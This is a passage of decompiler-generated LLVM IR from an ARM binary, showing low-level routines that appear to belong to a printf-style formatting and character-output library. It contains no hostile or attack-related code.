  ret i32 %v0_d88c
}

define i32 @function_d978() local_unnamed_addr {
dec_label_pc_d978:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d978 = load i32, i32* @r4, align 4
  store i32 %v3_d978, i32* %stack_var_-8, align 4
  %v0_d97c = load i32, i32* @r0, align 4
  %v1_d97c = add i32 %v0_d97c, 8
  %v2_d97c = inttoptr i32 %v1_d97c to i32*
  %v3_d97c = load i32, i32* %v2_d97c, align 4
  %v1_d980 = add i32 %v0_d97c, 16
  %v2_d980 = inttoptr i32 %v1_d980 to i32*
  %v3_d980 = load i32, i32* %v2_d980, align 4
  %v9_d984 = icmp eq i32 %v3_d980, %v3_d97c
  store i32 %v0_d97c, i32* %r4.global-to-local, align 4
  br i1 %v9_d984, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_d978
  store i32 %v3_d97c, i32* %v2_d980, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_d978, %bb
  %v1_d990 = xor i1 %v9_d984, true
  call void @__pseudo_cond_branch(i1 %v1_d990, i32 ptrtoint (i32* @global_var_130c8.305 to i32))
  %v0_d994 = load i32, i32* %r4.global-to-local, align 4
  %v1_d994 = add i32 %v0_d994, 8
  %v2_d994 = inttoptr i32 %v1_d994 to i32*
  %v3_d994 = load i32, i32* %v2_d994, align 4
  %v1_d998 = add i32 %v0_d994, 16
  %v2_d998 = inttoptr i32 %v1_d998 to i32*
  %v3_d998 = load i32, i32* %v2_d998, align 4
  %v2_d99c = sub i32 %v3_d998, %v3_d994
  %v2_d9a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d9a0, i32* @r4, align 4
  ret i32 %v2_d99c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_d9a8(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d9a8:
  %stack_var_-25 = alloca i8, align 1
  %v3_d9a8 = load i32, i32* @r4, align 4
  %v6_d9a8 = load i32, i32* @r5, align 4
  %v9_d9a8 = load i32, i32* @r6, align 4
  %v12_d9a8 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_d9b4 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_d9b4, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_d9cc2 = icmp eq i32 %arg3, 0
  br i1 %v2_d9cc2, label %dec_label_pc_d9ec, label %dec_label_pc_d9e0

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_d9e0
  %v1_d9c8 = add i32 %v0_d9c8, -1
  store i32 %v1_d9c8, i32* @r4, align 4
  %v2_d9cc = icmp eq i32 %v1_d9c8, 0
  %v0_d9d8 = load i32, i32* @r7, align 4
  br i1 %v2_d9cc, label %dec_label_pc_d9ec.loopexit, label %dec_label_pc_d9e0

dec_label_pc_d9e0:                                ; preds = %dec_label_pc_d9a8, %dec_label_pc_d9c8
  %v0_d9d84 = phi i32 [ %v0_d9d8, %dec_label_pc_d9c8 ], [ %arg1, %dec_label_pc_d9a8 ]
  %v3_d9e0 = inttoptr i32 %v0_d9d84 to i16*
  %v4_d9e0 = call i32 @function_1317c(i32 %v10_d9b4, i32 1, i16* %v3_d9e0)
  %v7_d9e4 = icmp eq i32 %v4_d9e0, 1
  %v0_d9c8 = load i32, i32* @r4, align 4
  br i1 %v7_d9e4, label %dec_label_pc_d9c8, label %dec_label_pc_d9ec.loopexit

dec_label_pc_d9ec.loopexit:                       ; preds = %dec_label_pc_d9c8, %dec_label_pc_d9e0
  %v0_d9ec.ph = phi i32 [ %v0_d9c8, %dec_label_pc_d9e0 ], [ 0, %dec_label_pc_d9c8 ]
  %v1_d9ec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_d9ec

dec_label_pc_d9ec:                                ; preds = %dec_label_pc_d9ec.loopexit, %dec_label_pc_d9a8
  %v1_d9ec = phi i32 [ 0, %dec_label_pc_d9a8 ], [ %v1_d9ec.pre, %dec_label_pc_d9ec.loopexit ]
  %v0_d9ec = phi i32 [ 0, %dec_label_pc_d9a8 ], [ %v0_d9ec.ph, %dec_label_pc_d9ec.loopexit ]
  %v2_d9ec = sub i32 %v1_d9ec, %v0_d9ec
  store i32 %v3_d9a8, i32* @r4, align 4
  store i32 %v6_d9a8, i32* @r5, align 4
  store i32 %v9_d9a8, i32* @r6, align 4
  store i32 %v12_d9a8, i32* @r7, align 4
  ret i32 %v2_d9ec

; uselistorder directives
  uselistorder i32 %v1_d9c8, { 1, 0 }
  uselistorder label %dec_label_pc_d9ec.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_d9e0, { 1, 0 }
}

define i32 @function_d9fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d9fc:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d9fc = load i32, i32* @r4, align 4
  store i32 %v3_d9fc, i32* %stack_var_-24, align 4
  %v6_d9fc = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_da04 = and i32 %arg2, 128
  %v2_da04 = icmp eq i32 %v1_da04, 0
  %v0_da08 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_da08, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_da04, label %dec_label_pc_da58thread-pre-split, label %dec_label_pc_da1c

dec_label_pc_da1c:                                ; preds = %dec_label_pc_d9fc
  store i32 %arg4, i32* @r0, align 4
  %v0_da20 = call i32 @function_f2e0()
  store i32 %v0_da20, i32* %r0.global-to-local, align 4
  %v1_da24 = load i32, i32* %r4.global-to-local, align 4
  %v2_da24 = sub i32 %v1_da24, %v0_da20
  store i32 %v2_da24, i32* @r4, align 4
  store i32 %v0_da20, i32* @r6, align 4
  %tmp12 = icmp slt i32 %v2_da24, 1
  br i1 %tmp12, label %.thread, label %dec_label_pc_da38

.thread:                                          ; preds = %dec_label_pc_da1c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_da54

dec_label_pc_da38:                                ; preds = %dec_label_pc_da1c
  %v0_da38 = load i32, i32* @r5, align 4
  %v1_da38 = urem i32 %v0_da38, 128
  %v0_da3c = load i32, i32* @r8, align 4
  store i32 %v0_da3c, i32* %r0.global-to-local, align 4
  %v3_da44 = trunc i32 %v1_da38 to i8
  %v4_da44 = call i32 @function_d9a8(i32 %v0_da3c, i8 %v3_da44, i32 %v2_da24)
  store i32 %v4_da44, i32* %r0.global-to-local, align 4
  %v1_da48 = load i32, i32* @r4, align 4
  %v9_da48 = icmp eq i32 %v4_da44, %v1_da48
  store i32 %v4_da44, i32* %r5.global-to-local, align 4
  br i1 %v9_da48, label %dec_label_pc_da38.dec_label_pc_da54_crit_edge, label %dec_label_pc_da74

dec_label_pc_da38.dec_label_pc_da54_crit_edge:    ; preds = %dec_label_pc_da38
  %v0_da54.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_da54

dec_label_pc_da54:                                ; preds = %.thread, %dec_label_pc_da38.dec_label_pc_da54_crit_edge
  %v0_da54 = phi i32 [ %v0_da54.pre, %dec_label_pc_da38.dec_label_pc_da54_crit_edge ], [ %v0_da20, %.thread ]
  store i32 %v0_da54, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_da58

dec_label_pc_da58thread-pre-split:                ; preds = %dec_label_pc_d9fc
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_da58

dec_label_pc_da58:                                ; preds = %dec_label_pc_da58thread-pre-split, %dec_label_pc_da54
  %v5_da64 = phi i32 [ %arg3, %dec_label_pc_da58thread-pre-split ], [ %v0_da54, %dec_label_pc_da54 ]
  %tmp13 = icmp slt i32 %v5_da64, 1
  br i1 %tmp13, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_da58
  br label %bb14

bb:                                               ; preds = %dec_label_pc_da58
  %v5_da60 = load i32, i32* @r7, align 4
  br label %bb14

bb14:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_da60, %bb ]
  %tmp15 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp15, i32 ptrtoint (i32* @global_var_1317c.306 to i32))
  %v0_da70 = load i32, i32* %r5.global-to-local, align 4
  %v2_da70 = add i32 %storemerge, %v0_da70
  store i32 %v2_da70, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_da74

dec_label_pc_da74:                                ; preds = %dec_label_pc_da38, %bb14
  %v0_da74 = phi i32 [ %v4_da44, %dec_label_pc_da38 ], [ %v2_da70, %bb14 ]
  store i32 %v0_da74, i32* %r0.global-to-local, align 4
  %v2_da78 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_da78, i32* %r4.global-to-local, align 4
  store i32 %v6_d9fc, i32* %r5.global-to-local, align 4
  ret i32 %v0_da74

; uselistorder directives
  uselistorder i32 %v0_da74, { 1, 0 }
  uselistorder i32 %v0_da54, { 1, 0 }
  uselistorder i32 %v2_da24, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 1, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_da74, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_da54, { 1, 0 }
}

define i32 @function_da80(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
dec_label_pc_da80:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_4()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_4()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_da80 = load i32, i32* @r5, align 4
  %v12_da80 = load i32, i32* @r7, align 4
  %v18_da80 = load i32, i32* @sb, align 4
  %v21_da80 = load i32, i32* @sl, align 4
  %v24_da80 = load i32, i32* @fp, align 4
  %v2_da88 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_da88, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_da88, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_da98 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_da98, i32* @r5, align 4
  %v2_da9c = call i32 @function_e168(i32* nonnull %stack_var_-352)
  store i32 %v2_da9c, i32* %r0.global-to-local, align 4
  %v1_daa4 = icmp slt i32 %v2_da9c, 0
  br i1 %v1_daa4, label %dec_label_pc_dab4, label %dec_label_pc_dae8

dec_label_pc_dab4:                                ; preds = %dec_label_pc_da80
  %v3_dab4 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_dab4, i32* @r4, align 4
  store i32 %v3_dab4, i32* @r0, align 4
  %v0_dabc = call i32 @function_f2e0()
  store i32 %v0_dabc, i32* %r0.global-to-local, align 4
  %v2_dac0 = icmp eq i32 %v0_dabc, 0
  br i1 %v2_dac0, label %bb, label %dec_label_pc_dad0

bb:                                               ; preds = %dec_label_pc_dab4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e138

dec_label_pc_dad0:                                ; preds = %dec_label_pc_dab4
  %v0_dad0 = load i32, i32* @r4, align 4
  store i32 %v0_dad0, i32* %r0.global-to-local, align 4
  %v0_dad4 = load i32, i32* @fp, align 4
  store i32 %v0_dad4, i32* %r2.global-to-local, align 4
  %v3_dad8 = inttoptr i32 %v0_dad4 to i16*
  %v4_dad8 = call i32 @function_1317c(i32 %v0_dad0, i32 %v0_dabc, i16* %v3_dad8)
  store i32 %v4_dad8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e138

dec_label_pc_dae8:                                ; preds = %dec_label_pc_da80
  %v0_dae8 = load i32, i32* @r5, align 4
  store i32 %v2_da88, i32* %r0.global-to-local, align 4
  %v2_daf0 = call i32 @function_e208(i32 %v2_da88, i32 %v0_dae8)
  store i32 %v2_daf0, i32* %r0.global-to-local, align 4
  store i32 656, i32* @ip, align 4
  %v0_db38 = load i32, i32* @r4, align 4
  store i32 %v0_db38, i32* %r2.global-to-local, align 4
  %v1_dbbc = bitcast i32* %stack_var_-352 to i8*
  %v4_dbcc = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_dbd8 = ptrtoint i32* %stack_var_-272 to i32
  %v2_dbf0 = ptrtoint i32* %stack_var_-40 to i32
  %v2_dc0c = icmp eq i32 %tmp104, 0
  %v2_df44 = ptrtoint i32* %stack_var_-200 to i32
  %v2_df88 = ptrtoint i32* %stack_var_-348 to i32
  %v2_df8c = ptrtoint i32* %stack_var_-72 to i32
  %v2_de40 = ptrtoint i32* %stack_var_-44 to i32
  %v2_de4c = ptrtoint i32* %stack_var_-52 to i32
  %v7_dca8 = zext i8 %tmp102 to i32
  %v2_dce0 = ptrtoint i32* %stack_var_-73 to i32
  %v1_dce8 = bitcast i32* %stack_var_-73 to i8*
  %v2_dcf0 = icmp ugt i32 %tmp104, 4
  %v7_dcf0 = icmp eq i32 %tmp104, 5
  %v7_dbd4 = ptrtoint i32* %stack_var_-280 to i32
  %v5_dc04195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_de14 = icmp ugt i32 %tmp104, 16
  %v7_de14 = icmp eq i32 %tmp104, 17
  %v2_de18 = xor i1 %v7_de14, true
  %v3_de18 = and i1 %v2_de14, %v2_de18
  %v2_de9c = icmp ugt i32 %tmp104, 18
  %v7_de9c = icmp eq i32 %tmp104, 19
  %v2_dea0 = xor i1 %v7_de9c, true
  %v3_dea0 = and i1 %v2_de9c, %v2_dea0
  %v7_df38 = icmp eq i32 %tmp104, 20
  %v1_dc50 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_19730.316 to i32), i32 -1)
  %v2_dc50 = inttoptr i32 %v1_dc50 to i8*
  %v2_dc7c = xor i1 %v7_dcf0, true
  %v3_dc7c = and i1 %v2_dcf0, %v2_dc7c
  %v7_dcb0 = icmp eq i32 %tmp104, 1
  %v2_dcf8 = xor i1 %v2_dcf0, true
  %v3_dcf8 = or i1 %v7_dcf0, %v2_dcf8
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_dd60 = icmp eq i32 %tmp104, 3
  %v11_dd6c = icmp eq i32 %tmp104, 4
  %v9_dbdc = mul nuw nsw i32 %v4_dbcc, 8
  %v10_dbdc = add i32 %v7_dbd4, %v9_dbdc
  br label %dec_label_pc_db3c.outer

dec_label_pc_db3c.outer:                          ; preds = %dec_label_pc_e11c, %dec_label_pc_dae8
  %v0_db3c45 = phi i32 [ %v3_e11c, %dec_label_pc_e11c ], [ %v0_db38, %dec_label_pc_dae8 ]
  %v0_dc70 = phi i32 [ %stack_var_-336.4, %dec_label_pc_e11c ], [ %tmp103, %dec_label_pc_dae8 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_e11c ], [ 0, %dec_label_pc_dae8 ]
  br label %dec_label_pc_db3c.outer36

dec_label_pc_db3c.outer36:                        ; preds = %dec_label_pc_db3c.outer, %dec_label_pc_e128
  %v0_db3c44 = phi i32 [ %v0_db3c45, %dec_label_pc_db3c.outer ], [ %v1_e128, %dec_label_pc_e128 ]
  %v5_db68 = phi i32 [ %v0_db3c45, %dec_label_pc_db3c.outer ], [ %v1_db98, %dec_label_pc_e128 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_db3c.outer ], [ %v1_e008, %dec_label_pc_e128 ]
  %v1_db3c188 = inttoptr i32 %v0_db3c44 to i8*
  %v2_db3c189 = load i8, i8* %v1_db3c188, align 1
  %v2_db40191 = icmp eq i8 %v2_db3c189, 0
  br i1 %v2_db40191, label %dec_label_pc_db58, label %bb138

bb138:                                            ; preds = %dec_label_pc_db3c.outer36, %.thread6
  %v2_db3c193 = phi i8 [ %v2_db3c, %.thread6 ], [ %v2_db3c189, %dec_label_pc_db3c.outer36 ]
  %v1_db50192 = phi i32 [ %v2_db50, %.thread6 ], [ %v0_db3c44, %dec_label_pc_db3c.outer36 ]
  %v8_db44 = icmp eq i8 %v2_db3c193, 37
  br i1 %v8_db44, label %dec_label_pc_db58, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_db50 = add i32 %v1_db50192, 1
  store i32 %v2_db50, i32* @r4, align 4
  %v1_db3c = inttoptr i32 %v2_db50 to i8*
  %v2_db3c = load i8, i8* %v1_db3c, align 1
  %v2_db40 = icmp eq i8 %v2_db3c, 0
  br i1 %v2_db40, label %dec_label_pc_db58, label %bb138

dec_label_pc_db58:                                ; preds = %bb138, %.thread6, %dec_label_pc_db3c.outer36
  %v1_db50.lcssa = phi i32 [ %v0_db3c44, %dec_label_pc_db3c.outer36 ], [ %v2_db50, %.thread6 ], [ %v1_db50192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_db58 = sub i32 %v1_db50.lcssa, %v5_db68
  %v9_db58 = icmp eq i32 %v1_db50.lcssa, %v5_db68
  br i1 %v9_db58, label %dec_label_pc_db8c, label %dec_label_pc_db60

dec_label_pc_db60:                                ; preds = %dec_label_pc_db58
  store i32 %v2_db58, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_db58, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_db60
  store i32 %v5_db68, i32* %r0.global-to-local, align 4
  %v5_db70 = load i32, i32* @fp, align 4
  store i32 %v5_db70, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_db60, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_db60 ]
  store i32 56184, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_1317c.306 to i32))
  %v0_db78 = load i32, i32* %r0.global-to-local, align 4
  %v1_db78 = load i32, i32* @r5, align 4
  %v9_db78 = icmp eq i32 %v0_db78, %v1_db78
  br i1 %v9_db78, label %dec_label_pc_db80, label %dec_label_pc_e130

dec_label_pc_db80:                                ; preds = %bb142
  %v2_db84 = add i32 %v0_db78, %stack_var_-356.1.ph37
  store i32 %v2_db84, i32* @ip, align 4
  %v0_db8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db8c

dec_label_pc_db8c:                                ; preds = %dec_label_pc_db58, %dec_label_pc_db80
  %v0_dba0 = phi i32 [ %v5_db68, %dec_label_pc_db58 ], [ %v0_db8c.pre, %dec_label_pc_db80 ]
  %v1_e008 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_db58 ], [ %v2_db84, %dec_label_pc_db80 ]
  %v1_db8c = inttoptr i32 %v0_dba0 to i8*
  %v2_db8c = load i8, i8* %v1_db8c, align 1
  %v2_db90 = icmp eq i8 %v2_db8c, 0
  br i1 %v2_db90, label %dec_label_pc_e138, label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db8c
  %v1_db98 = add i32 %v0_dba0, 1
  %v2_db98 = inttoptr i32 %v1_db98 to i8*
  %v3_db98 = load i8, i8* %v2_db98, align 1
  %v7_db9c = icmp eq i8 %v3_db98, 37
  store i32 %v1_db98, i32* %r2.global-to-local, align 4
  br i1 %v7_db9c, label %dec_label_pc_e128, label %dec_label_pc_dba8

dec_label_pc_dba8:                                ; preds = %dec_label_pc_db98
  store i32 %v2_da88, i32* @r4, align 4
  store i32 %v2_da88, i32* %r0.global-to-local, align 4
  store i32 %v1_db98, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_dbbc = call i32 @function_e450(i8* %v1_dbbc)
  store i32 %v2_da88, i32* @r0, align 4
  %v0_dbc4 = call i32 @function_e24c()
  store i32 %v0_dbc4, i32* %r0.global-to-local, align 4
  store i32 %v4_dbcc, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_dba8
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_dba8, %bb145
  %storemerge = phi i32 [ %v10_dbdc, %bb145 ], [ %v7_dbd8, %dec_label_pc_dba8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_dc04195, label %dec_label_pc_dbe8, label %dec_label_pc_dc08

dec_label_pc_dbe8:                                ; preds = %bb146, %dec_label_pc_dbe8
  %v5_dbf4197 = phi i32 [ %v5_dbf4, %dec_label_pc_dbe8 ], [ %v2_dbf0, %bb146 ]
  %v0_dbe8196 = phi i32 [ %v1_dbec, %dec_label_pc_dbe8 ], [ %storemerge, %bb146 ]
  %v2_dbe8 = add i32 %v5_dbf4197, -32
  %v3_dbe8 = inttoptr i32 %v2_dbe8 to i32*
  store i32 %v0_dbe8196, i32* %v3_dbe8, align 4
  %v0_dbec = load i32, i32* %r0.global-to-local, align 4
  %v1_dbec = add i32 %v0_dbec, 8
  store i32 %v1_dbec, i32* %r0.global-to-local, align 4
  %v1_dbf4.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_dbf4 = mul i32 %v1_dbf4.pre, 4
  %v5_dbf4 = add i32 %v4_dbf4, %v2_dbf0
  %v1_dc00 = add i32 %v1_dbf4.pre, 1
  store i32 %v1_dc00, i32* %r2.global-to-local, align 4
  %v5_dc04 = icmp slt i32 %v1_dbf4.pre, %tmp105
  br i1 %v5_dc04, label %dec_label_pc_dbe8, label %dec_label_pc_dc08

dec_label_pc_dc08:                                ; preds = %dec_label_pc_dbe8, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_dc0c, label %dec_label_pc_dc14, label %dec_label_pc_dc38

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dc08
  %v3_dc14 = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_e008, i32* @ip, align 4
  %v1_dc20 = inttoptr i32 %v3_dc14 to i32*
  %v2_dc20 = load i32, i32* %v1_dc20, align 4
  store i32 %v2_dc20, i32* %r0.global-to-local, align 4
  %v1_dc24 = and i32 %v0_dc70, 3840
  store i32 %v1_e008, i32* %r2.global-to-local, align 4
  %v3_dc2c = ashr i32 %v1_e008, 31
  %v4_dc30 = inttoptr i32 %v2_dc20 to i16*
  %v5_dc30 = call i32 @function_133fc(i16* %v4_dc30, i32 %v1_dc24, i32 %v1_e008, i32 %v3_dc2c)
  store i32 %v5_dc30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e11c

dec_label_pc_dc38:                                ; preds = %dec_label_pc_dc08
  br i1 %tmp207, label %dec_label_pc_ddd4, label %dec_label_pc_dc40

dec_label_pc_dc40:                                ; preds = %dec_label_pc_dc38
  %v3_dc50 = load i8, i8* %v2_dc50, align 1
  %v4_dc50 = zext i8 %v3_dc50 to i32
  store i32 %v4_dc50, i32* @r4, align 4
  %v7_dc54 = icmp eq i8 %v3_dc50, 10
  br i1 %v7_dc54, label %dec_label_pc_dc60, label %bb147

bb147:                                            ; preds = %dec_label_pc_dc40
  br label %bb151

dec_label_pc_dc60:                                ; preds = %dec_label_pc_dc40
  %v1_dc70 = and i32 %v0_dc70, 64
  %v2_dc70 = icmp eq i32 %v1_dc70, 0
  br i1 %v2_dc70, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_dc60
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_dc60, %bb150
  br i1 %v3_dc7c, label %.thread, label %dec_label_pc_dc84

.thread:                                          ; preds = %bb151
  %v5_dc7c = sub nsw i32 0, %v4_dc50
  store i32 %v5_dc7c, i32* @r4, align 4
  br label %dec_label_pc_dc9c

dec_label_pc_dc84:                                ; preds = %bb151
  br i1 %v7_dd60, label %bb152, label %dec_label_pc_dc90

bb152:                                            ; preds = %dec_label_pc_dc84
  br label %dec_label_pc_dc9c

dec_label_pc_dc90:                                ; preds = %dec_label_pc_dc84
  br i1 %v7_dcb0, label %dec_label_pc_dca0, label %dec_label_pc_dc9c

dec_label_pc_dc9c:                                ; preds = %.thread, %bb152, %dec_label_pc_dc90
  %v0_dcc881 = phi i32 [ %v5_dc7c, %.thread ], [ %v4_dc50, %bb152 ], [ %v4_dc50, %dec_label_pc_dc90 ]
  br label %dec_label_pc_dca0

dec_label_pc_dca0:                                ; preds = %dec_label_pc_dc90, %dec_label_pc_dc9c
  %v0_dcc880 = phi i32 [ %v0_dcc881, %dec_label_pc_dc9c ], [ %v4_dc50, %dec_label_pc_dc90 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_dc9c ], [ 6, %dec_label_pc_dc90 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_dca0 = load i32, i32* %stack_var_-348, align 4
  %v1_dca4 = icmp slt i32 %v3_dca0, 0
  %v7_dca8. = select i1 %v1_dca4, i32 %v7_dca8, i32 32
  store i32 %v7_dca8., i32* @sb, align 4
  br i1 %v7_dcb0, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_dca0
  store i32 %v2_dbf0, i32* %r2.global-to-local, align 4
  %v2_dcb8 = load i32, i32* @ip, align 4
  %v5_dcb8 = mul i32 %v2_dcb8, 4
  %v6_dcb8 = add i32 %v5_dcb8, %v2_dbf0
  %v2_dcbc = add i32 %v6_dcb8, -276
  %v3_dcbc = inttoptr i32 %v2_dcbc to i32*
  %v4_dcbc = load i32, i32* %v3_dcbc, align 4
  %v2_dcc4 = and i32 %v4_dcbc, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_dca0, %.thread15
  %storemerge93 = phi i32 [ %v2_dcc4, %.thread15 ], [ 1024, %dec_label_pc_dca0 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_dcc880, i32* @r2, align 4
  %v3_dccc = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_dccc, i32* @r1, align 4
  %v0_dcd0 = call i32 @function_1338c()
  store i32 %v0_dcd0, i32* @r2, align 4
  %v0_dcdc = load i32, i32* @r1, align 4
  store i32 %v0_dcdc, i32* @r3, align 4
  store i32 %v2_dce0, i32* %r0.global-to-local, align 4
  %v2_dce8 = call i32 @function_13428(i8* %v1_dce8)
  store i32 %v2_dce8, i32* %r0.global-to-local, align 4
  store i32 %v2_dce8, i32* @r4, align 4
  br i1 %v3_dcf8, label %bb160, label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %bb157
  %v3_dce8 = inttoptr i32 %v2_dce8 to i8*
  %v3_dcfc = load i8, i8* %v3_dce8, align 1
  %v7_dd00 = icmp eq i8 %v3_dcfc, 45
  %v2_dd08 = or i32 %v0_dc70, 2
  %v2_dd08.stack_var_-336.0 = select i1 %v7_dd00, i32 %v2_dd08, i32 %v0_dc70
  br i1 %v7_dd00, label %.thread17, label %dec_label_pc_dd1c

.thread17:                                        ; preds = %dec_label_pc_dcfc
  %v3_dd0c = add i32 %v2_dce8, 1
  store i32 %v3_dd0c, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_dd1c:                                ; preds = %dec_label_pc_dcfc
  %v1_dd1c = and i32 %v2_dd08.stack_var_-336.0, 2
  %v2_dd1c = icmp eq i32 %v1_dd1c, 0
  br i1 %v2_dd1c, label %dec_label_pc_dd28, label %bb158

bb158:                                            ; preds = %dec_label_pc_dd1c
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd1c
  %v1_dd28 = urem i32 %v2_dd08.stack_var_-336.0, 2
  %v2_dd28 = icmp eq i32 %v1_dd28, 0
  br i1 %v2_dd28, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_dd28
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_dd28, %bb159
  %v0_dd84 = phi i32 [ %v2_dce8, %bb157 ], [ %v3_dd0c, %.thread17 ], [ %v2_dce8, %dec_label_pc_dd28 ], [ %v2_dce8, %bb159 ], [ %v2_dce8, %bb158 ]
